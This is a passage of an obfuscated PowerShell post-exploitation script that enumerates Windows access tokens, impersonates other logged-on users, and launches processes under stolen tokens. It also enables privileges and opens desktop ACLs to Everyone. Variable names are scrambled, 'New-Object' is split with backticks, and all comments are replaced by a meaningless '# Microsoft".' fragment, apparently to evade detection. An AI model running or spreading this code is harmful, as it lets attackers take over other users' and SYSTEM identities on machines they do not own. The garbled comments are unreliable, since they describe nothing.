        $LiveBlush.Invoke($RedKnife) | Out-Null
        Write-Verbose "Enabled privilege: $SupplyBeam"
    }


    # Microsoft".
    function Set-DesktopACLs
    {
        Enable-SupplyBeam -SupplyBeam SeSecurityPrivilege

        # Microsoft".
        $WarnBadge = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
        $JazzyDrop = $LethalDamp.Invoke($WarnBadge, $false, $PriceyDeer.ACCESS_SYSTEM_SECURITY -bor $PriceyDeer.READ_CONTROL -bor $PriceyDeer.WRITE_DAC)

        if ($JazzyDrop -eq [IntPtr]::Zero)
        {
            Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -HookProud $JazzyDrop
        $LiveBlush.Invoke($JazzyDrop) | Out-Null

        # Microsoft".
        $StampNote = $OvalSon.Invoke("default", 0, $false, $PriceyDeer.DESKTOP_GENERIC_ALL -bor $PriceyDeer.WRITE_DAC)
        if ($StampNote -eq [IntPtr]::Zero)
        {
            Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -HookProud $StampNote
        $LiveBlush.Invoke($StampNote) | Out-Null
    }


    function Set-DesktopACLToAllowEveryone
    {
        Param(
            [IntPtr]$HookProud
            )

        [IntPtr]$RoundBranch = [IntPtr]::Zero
        [IntPtr]$WreckClose = [IntPtr]::Zero
        [IntPtr]$CuteHeap = [IntPtr]::Zero
        [IntPtr]$RepairPeel = [IntPtr]::Zero
        [IntPtr]$FootRub = [IntPtr]::Zero
        # Microsoft".
        $BadgeTrees = $DetectPotato.Invoke($HookProud, 0x7, $PriceyDeer.DACL_SECURITY_INFORMATION, [Ref]$RoundBranch, [Ref]$WreckClose, [Ref]$CuteHeap, [Ref]$RepairPeel, [Ref]$FootRub)
        if ($BadgeTrees -ne 0)
        {
            Write-Error "Unable to call GetSecurityInfo. ErrorCode: $BadgeTrees"
        }

        if ($CuteHeap -ne [IntPtr]::Zero)
        {
            $GirlTeam = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CuteHeap, [Type]$HammerTemper)

            # Microsoft".
            [UInt32]$UtterKnit = 2000
            $SofaTwist = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($UtterKnit)
            $GrainFoamy = $CameraMarch.Invoke(1, [IntPtr]::Zero, $SofaTwist, [Ref]$UtterKnit)
            if (-not $GrainFoamy)
            {
                Throw (ne`w`-ob`je`ct ComponentModel.Win32Exception)
            }

            # Microsoft".
            $SkipMarch = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TwigFail)
            $LastFeeble = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SkipMarch)
            $PetRoute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LastFeeble, [Type]$TwigFail)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LastFeeble)
            $PetRoute.pMultipleTrustee = [IntPtr]::Zero
            $PetRoute.MultipleTrusteeOperation = 0
            $PetRoute.TrusteeForm = $PriceyDeer.TRUSTEE_IS_SID
            $PetRoute.TrusteeType = $PriceyDeer.TRUSTEE_IS_WELL_KNOWN_GROUP
            $PetRoute.ptstrName = $SofaTwist

            # Microsoft".
            $EqualClover = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$CurlTwo)
            $SmileBranch = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($EqualClover)
            $CribFear = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SmileBranch, [Type]$CurlTwo)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($SmileBranch)
            $CribFear.grfAccessPermissions = 0xf03ff
            $CribFear.grfAccessMode = $PriceyDeer.GRANT_ACCESS
            $CribFear.grfInheritance = $PriceyDeer.OBJECT_INHERIT_ACE
            $CribFear.Trustee = $PetRoute

            [IntPtr]$CoverAnger = [IntPtr]::Zero

            $BadgeTrees = $ColorBoring.Invoke(1, [Ref]$CribFear, $CuteHeap, [Ref]$CoverAnger)
            if ($BadgeTrees -ne 0)
            {
                Write-Error "Error calling SetEntriesInAclW: $BadgeTrees"
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($SofaTwist)

            if ($CoverAnger -eq [IntPtr]::Zero)
            {
                throw "New DACL is null"
            }

            # Microsoft".
            $BadgeTrees = $ArmQuilt.Invoke($HookProud, 0x7, $PriceyDeer.DACL_SECURITY_INFORMATION, $RoundBranch, $WreckClose, $CoverAnger, $RepairPeel)
            if ($BadgeTrees -ne 0)
            {
                Write-Error "SetSecurityInfo failed. Return value: $BadgeTrees"
            }

            $ManMass.Invoke($FootRub) | Out-Null
        }
    }


    # Microsoft".
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            # Microsoft".
            [Parameter()]
            [Switch]
            $CrawlHusky
        )

        if ($CrawlHusky)
        {
            $PeckSkip = $PriceyDeer.TOKEN_ALL_ACCESS
        }
        else
        {
            $PeckSkip = $PriceyDeer.TOKEN_ASSIGN_PRIMARY -bor $PriceyDeer.TOKEN_DUPLICATE -bor $PriceyDeer.TOKEN_IMPERSONATE -bor $PriceyDeer.TOKEN_QUERY 
        }

        $AbsurdRepeat = ne`w`-ob`je`ct PSObject

        $HumKneel = $GustyStay.Invoke($PriceyDeer.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $AbsurdRepeat | Add-Member -MemberType NoteProperty -Name hProcess -RayPlucky $HumKneel
        if ($HumKneel -eq [IntPtr]::Zero)
        {
            # Microsoft".
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$TestedGreet = [IntPtr]::Zero
            $GrainFoamy = $HairNew.Invoke($HumKneel, $PeckSkip, [Ref]$TestedGreet)

            # Microsoft".
            if (-not $LiveBlush.Invoke($HumKneel))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $HumKneel = [IntPtr]::Zero

            if ($GrainFoamy -eq $false -or $TestedGreet -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $AbsurdRepeat | Add-Member -MemberType NoteProperty -Name hProcToken -RayPlucky $TestedGreet
            }
        }

        return $AbsurdRepeat
    }


    function Get-RedKnife
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $QueueRare
        )

        $PeckSkip = $PriceyDeer.TOKEN_ALL_ACCESS

        $JailNerve = ne`w`-ob`je`ct PSObject
        [IntPtr]$SecondGroovy = [IntPtr]::Zero

        $BearTrust = $SulkyNasty.Invoke($PriceyDeer.THREAD_ALL_ACCESS, $false, $QueueRare)
        if ($BearTrust -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -ne $PriceyDeer.ERROR_INVALID_PARAMETER) # Microsoft".
            {
                Write-Warning "Failed to open thread handle for ThreadId: $QueueRare. Error code: $ErrorCode"
            }
        }
        else
        {
            $GrainFoamy = $BanSpy.Invoke($BearTrust, $PeckSkip, $false, [Ref]$SecondGroovy)
            if (-not $GrainFoamy)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if (($ErrorCode -ne $PriceyDeer.ERROR_NO_TOKEN) -and  # Microsoft".
                 ($ErrorCode -ne $PriceyDeer.ERROR_INVALID_PARAMETER)) # Microsoft".
                {
                    Write-Warning "Failed to call OpenThreadToken for ThreadId: $QueueRare. Error code: $ErrorCode"
                }
            }
            else
            {
                if($Instance){
                    Write-Verbose "$Instance : Successfully queried thread token"
                }else{
                    Write-Verbose "Successfully queried thread token"
                }
            }

            # Microsoft".
            if (-not $LiveBlush.Invoke($BearTrust))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $BearTrust = [IntPtr]::Zero
        }

        $JailNerve | Add-Member -MemberType NoteProperty -Name hThreadToken -RayPlucky $SecondGroovy
        return $JailNerve
    }


    # Microsoft".
    function Get-TokenInformation
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $ExtendEarthy
        )

        $CloseTorpid = $null

        $ClipPack = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$SpoonElbow)
        [IntPtr]$StickSpill = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ClipPack)
        [UInt32]$UtterKnit = 0
        $GrainFoamy = $LipWaste.Invoke($ExtendEarthy, $BloodFrail::TokenStatistics, $StickSpill, $ClipPack, [Ref]$UtterKnit)
        if (-not $GrainFoamy)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "GetTokenInformation failed. Error code: $ErrorCode"
        }
        else
        {
            $FixKiss = [System.Runtime.InteropServices.Marshal]::PtrToStructure($StickSpill, [Type]$SpoonElbow)

            # Microsoft".
            $LazySign = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$DesignTaste))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($FixKiss.AuthenticationId, $LazySign, $false)

            [IntPtr]$KeenTempt = [IntPtr]::Zero
            $CannonPest = $UnitCave.Invoke($LazySign, [Ref]$KeenTempt)
            if ($CannonPest -ne 0 -and $KeenTempt -eq [IntPtr]::Zero)
            {
                Write-Warning "Call to LsaGetLogonSessionData failed. Error code: $CannonPest. LogonSessionDataPtr = $KeenTempt"
            }
            else
            {
                $AirHeady = [System.Runtime.InteropServices.Marshal]::PtrToStructure($KeenTempt, [Type]$LunchWink)
                if ($AirHeady.Username.Buffer -ne [IntPtr]::Zero -and 
                    $AirHeady.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    # Microsoft".
                    $AnimalWeary = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($AirHeady.Username.Buffer, $AirHeady.Username.Length/2)
                    $WorryPlane = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($AirHeady.LoginDomain.Buffer, $AirHeady.LoginDomain.Length/2)

                    # Microsoft".
                    # Microsoft".
                    # Microsoft".
                    if ($AnimalWeary -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]$OpenRepair = 100
                        [UInt32]$SootheTease = $OpenRepair / 2
                        [UInt32]$StoryChance = $OpenRepair / 2
                        [UInt32]$WindDull = 0
                        $TrucksRoyal = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($OpenRepair)
                        $KneeWine = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($OpenRepair)
                        $GrainFoamy = $AdmireBang.Invoke([IntPtr]::Zero, $AirHeady.Sid, $TrucksRoyal, [Ref]$SootheTease, $KneeWine, [Ref]$StoryChance, [Ref]$WindDull)

                        if ($GrainFoamy)
                        {
                            $AnimalWeary = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($TrucksRoyal)
                            $WorryPlane = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($KneeWine)
                        }
                        else
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "Error calling LookupAccountSidW. Error code: $ErrorCode"
                        }

                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrucksRoyal)
                        $TrucksRoyal = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($KneeWine)
                        $KneeWine = [IntPtr]::Zero
                    }

                    $CloseTorpid = ne`w`-ob`je`ct PSObject
                    $CloseTorpid | Add-Member -Type NoteProperty -Name Domain -RayPlucky $WorryPlane
                    $CloseTorpid | Add-Member -Type NoteProperty -Name Username -RayPlucky $AnimalWeary    
                    $CloseTorpid | Add-Member -Type NoteProperty -Name hToken -RayPlucky $ExtendEarthy
                    $CloseTorpid | Add-Member -Type NoteProperty -Name LogonType -RayPlucky $AirHeady.LogonType


                    # Microsoft".
                    $CloseTorpid | Add-Member -Type NoteProperty -Name IsElevated -RayPlucky $false

                    $TourPlacid = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$SweetAnger)
                    $GradePunish = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TourPlacid)
                    [UInt32]$UtterKnit = 0
                    $GrainFoamy = $LipWaste.Invoke($ExtendEarthy, $BloodFrail::TokenElevation, $GradePunish, $TourPlacid, [Ref]$UtterKnit)
                    if (-not $GrainFoamy)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
                    }
                    else
                    {
                        $WanderRat = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GradePunish, [Type]$SweetAnger)
                        if ($WanderRat.TokenIsElevated -ne 0)
                        {
                            $CloseTorpid.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($GradePunish)


                    # Microsoft".
                    $CloseTorpid | Add-Member -Type NoteProperty -Name TokenType -RayPlucky "UnableToRetrieve"

                    [UInt32]$CryBase = 4
                    [IntPtr]$MuscleTrip = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CryBase)
                    [UInt32]$UtterKnit = 0
                    $GrainFoamy = $LipWaste.Invoke($ExtendEarthy, $BloodFrail::TokenType, $MuscleTrip, $CryBase, [Ref]$UtterKnit)
                    if (-not $GrainFoamy)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$DrinkBouncy = [System.Runtime.InteropServices.Marshal]::PtrToStructure($MuscleTrip, [Type][UInt32])
                        switch($DrinkBouncy)
                        {
                            1 {$CloseTorpid.TokenType = "Primary"}
                            2 {$CloseTorpid.TokenType = "Impersonation"}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($MuscleTrip)


                    # Microsoft".
                    if ($CloseTorpid.TokenType -ieq "Impersonation")
                    {
                        $CloseTorpid | Add-Member -Type NoteProperty -Name ImpersonationLevel -RayPlucky "UnableToRetrieve"

                        [UInt32]$LightEasy = 4
                        [IntPtr]$IcicleFurry = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LightEasy) # Microsoft".
                        [UInt32]$UtterKnit = 0
                        $GrainFoamy = $LipWaste.Invoke($ExtendEarthy, $BloodFrail::TokenImpersonationLevel, $IcicleFurry, $LightEasy, [Ref]$UtterKnit)
                        if (-not $GrainFoamy)
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                        }
                        else
                        {
                            [UInt32]$MetalDuck = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IcicleFurry, [Type][UInt32])
                            switch ($MetalDuck)
                            {
                                0 { $CloseTorpid.ImpersonationLevel = "SecurityAnonymous" }
                                1 { $CloseTorpid.ImpersonationLevel = "SecurityIdentification" }
                                2 { $CloseTorpid.ImpersonationLevel = "SecurityImpersonation" }
                                3 { $CloseTorpid.ImpersonationLevel = "SecurityDelegation" }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($IcicleFurry)
                    }


                    # Microsoft".
                    $CloseTorpid | Add-Member -Type NoteProperty -Name SessionID -RayPlucky "Unknown"

                    [UInt32]$SpoonHoney = 4
                    [IntPtr]$StainEscape = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SpoonHoney)
                    [UInt32]$UtterKnit = 0
                    $GrainFoamy = $LipWaste.Invoke($ExtendEarthy, $BloodFrail::TokenSessionId, $StainEscape, $SpoonHoney, [Ref]$UtterKnit)
                    if (-not $GrainFoamy)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$PartMany = [System.Runtime.InteropServices.Marshal]::PtrToStructure($StainEscape, [Type][UInt32])
                        $CloseTorpid.SessionID = $PartMany
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StainEscape)


                    # Microsoft".
                    $CloseTorpid | Add-Member -Type NoteProperty -Name PrivilegesEnabled -RayPlucky @()
                    $CloseTorpid | Add-Member -Type NoteProperty -Name PrivilegesAvailable -RayPlucky @()

                    [UInt32]$RubFaded = 1000
                    [IntPtr]$GratePaste = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RubFaded)
                    [UInt32]$UtterKnit = 0
                    $GrainFoamy = $LipWaste.Invoke($ExtendEarthy, $BloodFrail::TokenPrivileges, $GratePaste, $RubFaded, [Ref]$UtterKnit)
                    if (-not $GrainFoamy)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        $ExpandChange = [System.Runtime.InteropServices.Marshal]::PtrToStructure($GratePaste, [Type]$CrowdMute)
                        
                        # Microsoft".
                        [IntPtr]$BoatClover = [IntPtr](Add-SignedIntAsUnsigned $GratePaste ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$CrowdMute, "Privileges")))
                        $UltraGlue = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$HugeBlood)
                        for ($AwakeOrder = 0; $AwakeOrder -lt $ExpandChange.PrivilegeCount; $AwakeOrder++)
                        {
                            $SkirtSkip = [IntPtr](Add-SignedIntAsUnsigned $BoatClover ($UltraGlue * $AwakeOrder))

                            $HorseTug = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SkirtSkip, [Type]$HugeBlood)

                            # Microsoft".
                            [UInt32]$CrackScary = 60
                            $LoadFarm = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($CrackScary)
                            $LewdDoubt = $SkirtSkip # Microsoft".

                            $GrainFoamy = $SwankyPhobic.Invoke([IntPtr]::Zero, $LewdDoubt, $LoadFarm, [Ref]$CrackScary)
                            if (-not $GrainFoamy)
                            {
                                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning "Call to LookupPrivilegeNameW failed. Error code: $ErrorCode. RealSize: $CrackScary"
                            }
                            $PizzasFold = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LoadFarm)

                            # Microsoft".
                            $AjarDad = ""
                            $IdeaBore = $false

                            if ($HorseTug.Attributes -eq 0)
                            {
                                $IdeaBore = $false
                            }
                            if (($HorseTug.Attributes -band $PriceyDeer.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq $PriceyDeer.SE_PRIVILEGE_ENABLED_BY_DEFAULT) # Microsoft".
                            {
                                $IdeaBore = $true
                            }
                            if (($HorseTug.Attributes -band $PriceyDeer.SE_PRIVILEGE_ENABLED) -eq $PriceyDeer.SE_PRIVILEGE_ENABLED) # Microsoft".
                            {
                                $IdeaBore = $true
                            }
                            if (($HorseTug.Attributes -band $PriceyDeer.SE_PRIVILEGE_REMOVED) -eq $PriceyDeer.SE_PRIVILEGE_REMOVED) # Microsoft".
                            {
                                Write-Warning "Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. "
                            }

                            if ($IdeaBore)
                            {
                                $CloseTorpid.PrivilegesEnabled += ,$PizzasFold
                            }
                            else
                            {
                                $CloseTorpid.PrivilegesAvailable += ,$PizzasFold
                            }

                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LoadFarm)
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($GratePaste)

                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($AirHeady.UserName.Length)"
                }

                # Microsoft".
                $SillyObject = $QuiltSturdy.Invoke($KeenTempt)
                $KeenTempt = [IntPtr]::Zero
                if ($SillyObject -ne 0)
                {
                    Write-Warning "Call to LsaFreeReturnBuffer failed. Error code: $SillyObject"
                }
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LazySign)
            $LazySign = [IntPtr]::Zero
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StickSpill)
        $StickSpill = [IntPtr]::Zero

        return $CloseTorpid
    }


    # Microsoft".
    function Get-SmoggyGroup
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            $InjectPoised
        )

        $FowlHarbor = @{}
        $ClassCurve = @{}
        $SweetWealth = @{}

        # Microsoft".
        foreach ($MuscleLovelyDream in $InjectPoised)
        {
            $MuscleLovely = $MuscleLovelyDream.Domain + "\" + $MuscleLovelyDream.Username
            if (-not $FowlHarbor.ContainsKey($MuscleLovely))
            {
                # Microsoft".
                # Microsoft".
                if ($MuscleLovelyDream.LogonType -ne 3 -and
                    $MuscleLovelyDream.Username -inotmatch "^DWM-\d+$" -and
                    $MuscleLovelyDream.Username -inotmatch "^LOCAL\sSERVICE$")
                {
                    $FowlHarbor.Add($MuscleLovely, $MuscleLovelyDream)
                }
            }
            else
            {
                # Microsoft".
                if($MuscleLovelyDream.IsElevated -eq $FowlHarbor[$MuscleLovely].IsElevated)
                {
                    if (($MuscleLovelyDream.PrivilegesEnabled.Count + $MuscleLovelyDream.PrivilegesAvailable.Count) -gt ($FowlHarbor[$MuscleLovely].PrivilegesEnabled.Count + $FowlHarbor[$MuscleLovely].PrivilegesAvailable.Count))
                    {
                        $FowlHarbor[$MuscleLovely] = $MuscleLovelyDream
                    }
                }
                # Microsoft".
                elseif (($MuscleLovelyDream.IsElevated -eq $true) -and ($FowlHarbor[$MuscleLovely].IsElevated -eq $false))
                {
                    $FowlHarbor[$MuscleLovely] = $MuscleLovelyDream
                }
            }
        }

        # Microsoft".
        foreach ($MuscleLovelyDream in $InjectPoised)
        {
            $GrateLowly = "$($MuscleLovelyDream.Domain)\$($MuscleLovelyDream.Username)"

            # Microsoft".
            foreach ($SupplyBeam in $MuscleLovelyDream.PrivilegesEnabled)
            {
                if ($ClassCurve.ContainsKey($SupplyBeam))
                {
                    if($ClassCurve[$SupplyBeam] -notcontains $GrateLowly)
                    {
                        $ClassCurve[$SupplyBeam] += ,$GrateLowly
                    }
                }
                else
                {
                    $ClassCurve.Add($SupplyBeam, @($GrateLowly))
                }
            }

            # Microsoft".
            foreach ($SupplyBeam in $MuscleLovelyDream.PrivilegesAvailable)
            {
                if ($SweetWealth.ContainsKey($SupplyBeam))
                {
                    if($SweetWealth[$SupplyBeam] -notcontains $GrateLowly)
                    {
                        $SweetWealth[$SupplyBeam] += ,$GrateLowly
                    }
                }
                else
                {
                    $SweetWealth.Add($SupplyBeam, @($GrateLowly))
                }
            }
        }

        $MineTongue = @{
            TokenByUser = $FowlHarbor
            TokenByEnabledPriv = $ClassCurve
            TokenByAvailablePriv = $SweetWealth
        }

        return (ne`w`-ob`je`ct PSObject -Property $MineTongue)
    }


    function Invoke-ClamAwake
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $ExtendEarthy
        )

        # Microsoft".
        [IntPtr]$HorseBack = [IntPtr]::Zero
        $GrainFoamy = $AwfulBottle.Invoke($ExtendEarthy, $PriceyDeer.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$HorseBack) # Microsoft".
        if (-not $GrainFoamy)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $GrainFoamy = $AjarFill.Invoke($HorseBack)
            if (-not $GrainFoamy)
            {
                $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
            }
        }

        $GrainFoamy = $LiveBlush.Invoke($HorseBack)
        $HorseBack = [IntPtr]::Zero
        if (-not $GrainFoamy)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
        }

        return $GrainFoamy
    }


    function Create-ProcessWithToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $ExtendEarthy,

            [Parameter(Position=1, Mandatory=$true)]
            [String]
            $ProcessName,

            [Parameter(Position=2)]
            [String]
            $ProcessArgs,

            [Parameter(Position=3)]
            [Switch]
            $FutureCover
        )
        Write-Verbose "Entering Create-ProcessWithToken"
        # Microsoft".
        [IntPtr]$HorseBack = [IntPtr]::Zero
        $GrainFoamy = $AwfulBottle.Invoke($ExtendEarthy, $PriceyDeer.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$HorseBack)
        if (-not $GrainFoamy)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $TentWhole = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$SomberSwing)
            [IntPtr]$GratisClap = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TentWhole)
            $LoveBucket.Invoke($GratisClap, 0, $TentWhole) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($GratisClap, $TentWhole) # Microsoft".

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$ProcessName")
            $ProcessArgsPtr = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
            }
            
            $SticksStingy = ""
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                # Microsoft".
                # Microsoft".
                # Microsoft".
                Write-Verbose "Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."
                Enable-SupplyBeam -SupplyBeam SeAssignPrimaryTokenPrivilege
                $GrainFoamy = $RifleSwanky.Invoke($HorseBack, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $GratisClap, $ProcessInfoPtr)
                $SticksStingy = "CreateProcessAsUserW"
            }
            else
            {
                Write-Verbose "Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."
                $GrainFoamy = $NationSpicy.Invoke($HorseBack, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $GratisClap, $ProcessInfoPtr)
                $SticksStingy = "CreateProcessWithTokenW"
            }
            if ($GrainFoamy)
            {
                # Microsoft".
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                $LiveBlush.Invoke($ProcessInfo.hProcess) | Out-Null
                $LiveBlush.Invoke($ProcessInfo.hThread) | Out-Null

		# Microsoft".
		if ($FutureCover) {
			# Microsoft".
			$ElbowBest = Get-Process -Id $ProcessInfo.dwProcessId

			# Microsoft".
			$null = $ElbowBest.Handle

			# Microsoft".
			$ElbowBest
		}
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "$SticksStingy failed. Error code: $ErrorCode"
            }

            # Microsoft".
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($GratisClap)
            $GratisClap = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            # Microsoft".
            $GrainFoamy = $LiveBlush.Invoke($HorseBack)
            $HorseBack = [IntPtr]::Zero
            if (-not $GrainFoamy)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }
        }
    }


    function Free-InjectPoised
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            $TeaseSmelly
        )

        foreach ($BallSame in $TeaseSmelly)
        {
            $GrainFoamy = $LiveBlush.Invoke($BallSame.hToken)
            if (-not $GrainFoamy)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle in Free-InjectPoised. ErrorCode: $ErrorCode"
            }
            $BallSame.hToken = [IntPtr]::Zero
        }
    }


    # Microsoft".
    function Enum-InjectPoised
    {
        $InjectPoised = @()

        # Microsoft".
        # Microsoft".
        $ChessTouch = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
